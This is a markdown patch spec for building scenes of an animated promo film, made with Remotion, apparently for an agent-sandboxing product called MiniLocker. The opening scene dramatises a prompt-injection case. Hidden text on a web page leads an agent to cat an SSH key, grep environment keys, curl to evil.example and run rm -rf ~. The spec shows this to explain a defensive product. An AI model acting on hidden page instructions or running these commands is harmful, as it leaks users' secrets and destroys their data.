@@ -1,0 +1,18 @@
+### PATCH 12 - Master timeline + S0 Hook + S1 Title
+
+**Needs:** 00-11
+**Paste existing:** `docs/PATCH_NOTES.md`, `src/Root.tsx`, `src/MiniLockerFilm.tsx`, `src/config/timeline.ts`, `src/config/camera.ts`, `src/config/copy.ts`, `src/fx/Camera.tsx`, `src/fx/KineticText.tsx`, `src/fx/Glow.tsx`, `src/fx/GridPaper.tsx`, `src/ui/Mark.tsx`, `src/ui/RadiusDial.tsx`, `src/ui/GlitchLayer.tsx`, `src/ui/FilmApp.tsx`
+**Attach from BIBLE:** sections 4, 5, 6 (S0, S1), Appendix B
+
+```
+PATCH 12 - Master timeline, S0 Hook, S1 Title, and stubs for later scenes.
+
+CREATE / REPLACE (full files):
+- src/MiniLockerFilm.tsx (replace the temporary one): stage (gradient #08080b to #121216, soft drifting crimson radial glow rgba(255,32,82,.08-.14), grain 3%, vignette 12%, GridPaper only in S1/S9), global <Camera> wrapping the window, <FilmApp/> mounted from f560 (it must already be docked and positioned when S2 begins), scene overlay components in <Sequence>s, global cursor driven by the concatenated SN_CURSOR arrays, concatenated SN_CAMERA arrays, captions. It imports every scene from src/scenes/index.ts so it never needs editing again when a scene file is replaced. The Preview composition reuses it at 960x540.
+- src/scenes/S0Hook.tsx: per BIBLE S0. f0-11 pure #050505; f12-59 a generic "article" page card rises (window spring, slight tilt) with a mono line typing "agent > summarise this page"; f60 a spotlight scan sweeps the page and reveals the hidden crimson text (the real string from Appendix B, display:none div text) with a typed reveal; f105-165 four terminal lines slam in on beats (cat the SSH key, env | grep KEY, curl to https://evil.example/collect, rm -rf ~) each with a hit; tiny mono tag bottom-left "ILLUSTRATION - an unconstrained agent" for the whole beat; f165-179 glitch layer ramps to 1 and the page collapses; f180 caption (kinetic) "Agents with a shell and a browser are one bad page away from a bad day." in two lines, "bad day" in accent-ink; f270-299 everything crushes into one crimson dot at the center (the Mark's core dot). Export S0_CAMERA (mostly static with slow push and a 3% punch at f60 and f105), S0_CURSOR (empty), overlay.
+- src/scenes/S1Title.tsx: per BIBLE S1. f300 dot pulse + sub-impact; the Mark BUILDS (core, ring r6, ring r10.4, dotted ring) f300-345 on beats; f345-419 the Mark morphs into the 5-arc RadiusDial, arcs sweeping in 6 f apart with the small-caps labels network, policy, filesystem, secrets, compute fading in; f420 impact: eyebrow chip "VULTR AGENT RUSH - BLAST RADIUS ZERO" (mono, accent), then "MiniLocker" (CMU Serif 700, about 150 px, "Locker" in accent-ink) masked rise at f435, tagline two lines f480-540; f540-599 camera pushes into the dial which scales and travels to the Workspace blast-panel position as the app window rises under it (a match cut); the grid paper fades. Export S1_CAMERA, S1_CURSOR (empty), overlay. The app window must already be mounted but dimmed and off-frame so the dial lands exactly on the BlastPanel's dial anchor (use src/config/anchors.ts or focus.ts "dial").
+- Stub files (valid, compiling, clearly commented as stubs to be REPLACED in their patch) for S2Work, S3Decoys, S4Rewind (plus src/scenes/s4/S4a.tsx, S4b.tsx), S5Page, S6Evidence, S7Value, S8Vultr, S9Outro, each exporting the overlay component (renders null), SN_CAMERA = [] and SN_CURSOR = [] (S4 exports the same through S4Rewind.tsx which concatenates the a/b arrays).
+- src/scenes/index.ts barrel.
+
+CHECK: npx tsc --noEmit ; npx remotion still src/index.ts MiniLockerFilm out/qa/f060.png --frame=60 ; same for --frame=300, 420, 560 ; scrub 0-600 in the Studio: beat-aligned hits at f60, f180, f300, f420; no crossfades; the dial lands on the panel anchor at f600.
+```
